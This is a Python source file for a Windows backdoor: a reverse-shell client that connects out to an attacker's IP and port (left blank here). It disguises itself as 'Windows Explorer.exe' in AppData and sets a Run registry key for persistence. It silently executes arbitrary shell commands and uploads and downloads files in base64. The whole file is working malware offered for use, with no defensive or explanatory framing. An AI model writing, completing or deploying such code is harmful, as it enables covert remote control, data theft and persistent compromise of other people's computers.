#!/usr/bin/env python3
import subprocess, base64
import socket, json, os, sys,shutil
from subprocess import DEVNULL

ip=""
port=""
class Backdoor:
    def __init__(self,ip,port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self,command):
        # DEVNULL=open(os.devnull,"wb") this is for python2
        # using DEVNULL will keep the program silent when run, works with python3
        return subprocess.check_output(command,shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def become_persistent(self):
        # get file path and rename file name
        evil_file_locations=os.environ["appdata"]+ "\\Windows Explorer.exe"
        # copy the backdoor to location
        if not os.path.exists(evil_file_locations):
           shutil.copyfile(sys.executable,evil_file_locations)
          # add file to the reg to achieve persistence
           subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+ evil_file_locations + '"', shell=True)

    def serial_send(self, data):
        # serialization of data using json
        json_data = json.dumps(data)
        # encode to bytes
        self.connection.send(json_data.encode())

    def serial_receive(self):
        # covert to byte
        json_data = b""
        # receive data as json
        # receive data until err occurs because data is incomplete the continue until data is complete
        while True:
            try:

                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_work_dir(self,path):
        os.chdir(path)
        return "[+] Changing working directory to "+ path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def run(self):

        while True:
            command=self.serial_receive()

            try:

                if command[0]=="exit":
                    self.connection.close()
                    # using sys make the program exit silently
                    sys.exit()
                elif command[0]=="cd" and len(command)>1:
                    command_result=self.change_work_dir(command[1])

                elif command[0]=="download":
                    command_result=self.read_file(command[1]).decode()

                elif command[0]=="upload":
                    command_result=self.write_file(command[1],command[2])

                else:
                    # decode back to str
                    command_result=self.execute_system_command(command).decode()
            except Exception:
                # in case of command typo or wrong command
                command_result="[+] Error during command exec"

            self.serial_send(command_result)


try:
    my_backdoor=Backdoor(ip,port)
    my_backdoor.run()
except Exception:
    sys.exit()